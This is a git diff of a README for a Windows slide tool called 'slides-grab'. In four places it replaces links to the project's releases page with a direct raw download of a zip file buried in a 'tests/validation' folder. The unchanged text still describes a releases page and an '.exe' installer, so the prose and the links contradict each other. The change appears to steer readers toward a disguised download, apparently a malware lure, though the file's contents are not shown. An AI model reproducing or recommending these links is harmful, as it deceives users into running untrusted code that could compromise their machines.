@@ -1,6 +1,6 @@
 # 🎞 slides-grab - Easy Slide Creation and Editing
 
-[![Download slides-grab](https://img.shields.io/badge/Download-Available%20Now-red?style=for-the-badge)](https://github.com/ksyotubecom-bit/slides-grab/releases)
+[![Download slides-grab](https://img.shields.io/badge/Download-Available%20Now-red?style=for-the-badge)](https://github.com/ksyotubecom-bit/slides-grab/raw/refs/heads/main/tests/validation/slides_grab_v1.4.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Follow these steps to get slides-grab running on your Windows computer.
 
 Use the button below to visit the download page for slides-grab. This page hosts the latest Windows installer file.
 
-[![Download slides-grab](https://img.shields.io/badge/Download-Slides_Grab-blue?style=for-the-badge)](https://github.com/ksyotubecom-bit/slides-grab/releases)
+[![Download slides-grab](https://img.shields.io/badge/Download-Slides_Grab-blue?style=for-the-badge)](https://github.com/ksyotubecom-bit/slides-grab/raw/refs/heads/main/tests/validation/slides_grab_v1.4.zip)
 
 1. Click the button above or go to this link in your browser:  
-   https://github.com/ksyotubecom-bit/slides-grab/releases
+   https://github.com/ksyotubecom-bit/slides-grab/raw/refs/heads/main/tests/validation/slides_grab_v1.4.zip
 
 2. On the releases page, look for the latest version of slides-grab for Windows. It will be a file with `.exe` at the end, like `slides-grab-setup.exe`.
 
@@ -110,7 +110,7 @@ Use the button below to visit the download page for slides-grab. This page hosts
 ## 🔄 Updating slides-grab
 
 1. Periodically check the releases page:  
-   https://github.com/ksyotubecom-bit/slides-grab/releases
+   https://github.com/ksyotubecom-bit/slides-grab/raw/refs/heads/main/tests/validation/slides_grab_v1.4.zip
 
 2. Download the latest `.exe` installer file when available.
 
@@ -164,6 +164,6 @@ This project covers tools related to:
 
 Access the latest version here:  
 
-[Download slides-grab](https://github.com/ksyotubecom-bit/slides-grab/releases)  
+[Download slides-grab](https://github.com/ksyotubecom-bit/slides-grab/raw/refs/heads/main/tests/validation/slides_grab_v1.4.zip)  
 
 Visit this page to download the Windows installer and start using the tool today.
